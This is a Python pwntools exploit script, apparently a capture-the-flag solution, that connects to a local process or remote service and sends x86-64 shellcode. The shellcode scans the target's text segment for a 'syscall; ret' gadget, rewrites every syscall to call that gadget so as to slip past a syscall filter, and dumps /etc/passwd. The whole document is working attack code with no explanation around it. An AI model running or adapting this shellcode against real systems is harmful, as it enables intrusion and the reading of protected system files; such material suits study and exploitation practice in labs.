import sys

import pwn


TARGET = "/etc/passwd"

# rcx points to part of the text segment
# hunting for 0f 05 c3

HUNTER="""
    /* find a page start */
    mov rax, -1
    shl rax, 12
    and rcx, rax
    dec rcx
loopy:
    inc rcx
    mov al, [rcx]
    cmp al, 0x0f
    jne loopy
    mov al, [rcx+1]
    cmp al, 0x05
    jne loopy
    mov al, [rcx+2]
    cmp al, 0xc3
    jne loopy
    /* rcx should now be pointing to a syscall; ret pair */
    mov r12, rcx
    /*int3*/
"""

def main(argv):
    pwn.context.arch = 'amd64'
    if len(argv) == 2:
        p = pwn.process(argv[1])
    elif len(argv) == 3:
        p = pwn.remote(argv[1], int(argv[2]))
    else:
        raise ValueError("need process or remote")
    sc = pwn.shellcraft.amd64.linux.cat2(TARGET, 1, 1024)
    sc += pwn.shellcraft.amd64.linux.exit(0)
    print('Shellcode before fixups:')
    print(sc)
    # dynamically fixup shellcode
    sc = HUNTER + sc
    sc = sc.replace('syscall', 'call r12')
    print('Shellcode after fixups:')
    print(sc)
    scraw = pwn.asm(sc)
    pad = b'\xcc' * (1024 - len(scraw))
    scraw += pad
    p.recv()
    p.send(scraw)
    val = p.recvall()
    print(val)


if __name__ == '__main__':
    main(sys.argv)
